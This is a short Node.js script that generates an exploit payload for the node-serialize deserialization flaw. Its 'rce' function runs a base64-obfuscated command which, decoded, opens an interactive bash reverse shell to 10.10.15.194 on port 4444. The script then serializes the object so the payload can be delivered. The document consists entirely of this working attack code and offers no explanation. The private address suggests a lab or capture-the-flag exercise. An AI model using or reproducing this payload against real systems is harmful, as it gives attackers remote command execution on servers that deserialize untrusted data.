var y = {
rce : function(){
require('child_process').exec('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xOTQvNDQ0NCAwPiYxCg==\"
| base64 -d | bash /',
function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
